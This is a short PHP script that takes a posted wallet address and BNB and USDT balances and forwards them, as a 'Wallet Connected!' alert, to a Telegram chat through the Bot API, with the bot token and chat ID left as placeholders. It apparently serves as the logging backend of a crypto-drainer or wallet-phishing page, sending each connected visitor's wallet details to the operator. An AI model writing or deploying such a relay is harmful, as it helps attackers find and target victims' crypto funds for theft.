<?php
$data = json_decode(file_get_contents("php://input"), true);

$address = isset($data['wallet']) ? $data['wallet'] : 'Not Found';
$bnb     = isset($data['bnb']) ? $data['bnb'] : '0';
$usdt    = isset($data['usdt']) ? $data['usdt'] : '0';

$token   = 'YOUR_BOT_TOKEN';
$chat_id = 'YOUR_CHAT_ID';

$message = "📥 *Wallet Connected!*\n\n"
         . "👛 *Address:* `$address`\n"
         . "💰 *BNB:* $bnb\n"
         . "💸 *USDT:* $usdt";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown");
?>
